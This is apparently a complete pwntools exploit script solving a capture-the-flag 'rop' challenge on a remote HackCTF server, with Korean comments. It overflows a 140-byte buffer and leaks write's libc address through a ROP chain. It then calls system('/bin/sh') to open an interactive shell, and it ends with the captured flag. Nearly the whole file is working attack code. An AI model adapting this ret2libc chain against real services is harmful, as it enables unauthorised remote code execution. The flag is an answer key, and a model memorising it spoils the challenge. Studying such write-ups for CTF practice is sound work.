#! -*- coding: utf-8 -*-
from pwn import *

state = 1	# 0 is locally

if state == 0:
	p = process("./rop")
else :
	p = remote("ctf.j0n9hyun.xyz",3021)
#이름에서부터 rop를 유도하는 문제.ret 0xffffd4cc , 스택 0xffffd440 =>140바이트
#write 함수를 통해 libc leak 을 하고 system("/bin/sh")를 호출하자. 
#아니다, rop 할거같으면 그냥 입력만 해주고 execve 호출하자. 
#왜인지는 모르겠다. 입력함수를 통해 "/bin/sh" 를 bss 영역에 올리는 방식은
#실패했고, 해당 문자열을 라이브러리를 통해 가져와서 쓰는 방법은 성공이다 

read_plt = 0x8048310
write_plt = 0x8048340
write_got = 0x804a018
main = 0x08048470

if state == 0:
	write_offset = 0xE6D80
	system_offset = 0x3D200
	bin_offset = 0x17E0CF
else :
	write_offset = 0xd43c0
	system_offset = 0x3a940 
	bin_offset = 0x15902b
	
bss = 0x804a024
pop3ret = 0x8048509

#pause()
payload = "a"*140
payload += p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4)
#payload += p32(read_plt) + p32(pop3ret) + p32(0) + p32(bss) + p32(8)
payload += p32(main)

p.sendline(payload)

rcv = u32(p.recv(4))
log.info("addr : "+hex(rcv))
libc = rcv - write_offset
system = libc+system_offset
bin = libc + bin_offset

sleep(0.5)

#p.sendline("/bin/sh\00")

log.info("libc : "+hex(libc))
log.info("system : "+hex(system))

payload2 = "b"*140
#payload2 += p32(system) + "CCCC" + p32(bss)
payload2 += p32(system) + "CCCC" + p32(bin)

p.sendline(payload2)
p.interactive()

#HackCTF{4bcd3fg7ijPlmA4pqrtuvxza2cdef}